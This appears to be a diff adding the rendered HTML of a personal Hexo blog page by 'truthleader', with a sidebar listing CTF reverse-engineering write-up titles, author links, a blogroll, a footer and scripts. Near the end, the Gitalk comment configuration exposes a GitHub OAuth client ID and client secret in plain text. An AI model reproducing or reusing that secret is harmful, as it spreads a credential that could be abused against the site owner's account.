at IDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-UPX-mini"><span class="nav-number">5.2.</span> <span class="nav-text">[Week1] UPX mini</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-ez-maze"><span class="nav-number">5.3.</span> <span class="nav-text">[Week1] ez_maze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-Ez-Xor"><span class="nav-number">5.4.</span> <span class="nav-text">[Week1] Ez Xor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1-BasePlus"><span class="nav-number">5.5.</span> <span class="nav-text">[Week1] BasePlus</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="truthleader"
+      src="/images/AveMujica.png">
+  <p class="site-author-name" itemprop="name">truthleader</p>
+  <div class="site-description" itemprop="description">学习是美德，知识是财富，求道是目的</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthleader" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthleader" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://maonie.top/" title="https:&#x2F;&#x2F;maonie.top" rel="noopener" target="_blank">猫涅的秘密结社</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.benben.work/" title="https:&#x2F;&#x2F;blog.benben.work" rel="noopener" target="_blank">benben's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://rickk1c137.github.io/" title="https:&#x2F;&#x2F;rickk1c137.github.io&#x2F;" rel="noopener" target="_blank">RickkCit</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mogo.work/" title="https:&#x2F;&#x2F;mogo.work" rel="noopener" target="_blank">沫篝的幻想世界</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0666-lzyt.top/" title="https:&#x2F;&#x2F;0666-lzyt.top&#x2F;" rel="noopener" target="_blank">Des*tiny的博客</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">truthleader</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">16k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">52 mins.</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23liFKtoWwe3mBPY9l',
+      clientSecret: '2a45858fd265c69969a2bf3f90a43a159c4c96ff',
+      repo        : 'truthleader.github.io',
+      owner       : 'truthleader',
+      admin       : ['truthleader'],
+      id          : 'c2ece1a39731f0add1adc96a69b3d02f',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
